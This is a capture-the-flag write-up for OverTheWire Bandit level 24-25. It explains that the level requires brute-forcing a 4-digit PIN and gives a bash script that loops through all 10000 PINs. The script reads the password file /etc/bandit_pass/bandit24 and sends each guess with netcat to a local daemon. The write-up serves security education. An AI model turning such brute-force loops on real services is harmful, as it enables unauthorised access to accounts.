# Level 24-25


## Level Goals

> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.  

## write-up

So write a script that will try all the 10000 combinations.
##### Script:
	#!/bin/bash
	
	for i in {0..9}
	do
		for j in {0..9}
		do
			for k in {0..9}
			do
				for l in {0..9}
				do
				echo
				echo ---------
				echo $i$j$k$l
				echo "$(cat /etc/bandit_pass/bandit24) $i$j$k$l" | nc -v localhost 30002 >> /tmp/bandit25pass.txt
				done
			done
		done
	done  



